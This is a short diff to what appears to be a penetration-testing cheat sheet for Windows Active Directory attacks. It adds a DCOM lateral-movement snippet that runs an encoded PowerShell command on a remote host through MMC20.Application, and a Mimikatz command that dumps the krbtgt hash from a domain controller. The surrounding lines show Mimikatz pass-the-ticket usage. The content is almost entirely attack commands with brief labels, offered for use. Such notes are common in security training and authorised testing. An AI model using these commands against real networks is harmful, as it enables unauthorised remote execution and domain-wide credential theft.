@@ -578,6 +578,14 @@ new powershell will have mismatched whoami. run net use or net view to retrieve 
 	kerberos::ptt <ticketname>
 retrieve and obtain an existing ticket of another user on the local machine  
 
+## DCOM
+	$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","123.123.123.123"))
+	$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-e ...","7")
+
+## krbtgt dump
+	lsadump::lsa /patch
+dumps krbtgt hash from domain controller  
+
 # APPENDIX
 ## Kali built-in wordlists
 ### Passwords
